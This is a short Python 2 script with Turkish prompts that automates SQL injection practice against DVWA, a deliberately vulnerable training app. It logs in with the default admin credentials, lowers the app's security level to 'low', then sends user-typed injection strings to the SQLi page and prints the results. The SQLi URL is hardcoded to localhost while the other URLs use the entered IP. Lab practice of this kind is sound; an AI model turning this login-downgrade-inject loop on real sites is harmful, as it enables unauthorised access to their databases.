#Hacknomeister
#17.11.2016
import time
import mechanize
import re
import sys
br = mechanize.Browser()
br.set_handle_robots(False)
print "Hacknology iyi gunler diler (:"
time.sleep(1)
idname = "admin"
pw = "password"
ip = raw_input("[*]Bir ip adresi giriniz: ")
gir = "http://"+ip+"/dvwa/login.php"
yol = "http://localhost/dvwa/vulnerabilities/sqli/"
giris = ""
def log_on():
    br.open(gir)
    br.select_form(nr=0)
    br.form["username"] = idname
    br.form["password"] = pw
    oku = br.submit().read()
    if "Welcome" in oku:
        print "[+] Basarili"
        print "Cikmak icin 'exit' yazin"
    else:
        print "[-] Baglanti basarisiz"
        time.sleep(2)
        sys.exit()

def komut():
    br.open(yol)
    br.select_form(nr=0)
    kod = raw_input("[*]Kodu giriniz: ")
    if kod == "exit":
        print "Kapatiliyor..."
        time.sleep(1)
        sys.exit()
    else:
        pass
    br.form["id"] = kod
    oku = br.submit("Submit").read()
    a = oku.split("<pre>")
    b = a[1].split("</pre>")
    print b[0]

def guvenlik():
    dizine_git = br.open("http://" + ip + "/dvwa/security.php").read()
    guvenlik_cek = re.findall("<p>Security level is currently: <em>(.*?)</em>.<p>", dizine_git)
    if guvenlik_cek[0] != "low":
        print  "[!]Guvenlik seviyesi: %s" % (guvenlik_cek[0])
        print "Duzenleniyor..."
    if guvenlik_cek[0] == "low":
        pass
    else:
        br.select_form(nr=0)
        br.find_control(name="security").value = ["low"]
        br.submit("seclev_submit")
        u = br.open("http://" + ip + "/dvwa/security.php").read()
        t = re.findall("<p>Security level is currently: <em>(.*?)</em>.<p>", u)
        print  "[+]Guvenlik seviyesi: %s" % (t[0])

log_on()
guvenlik()
while True:
    komut()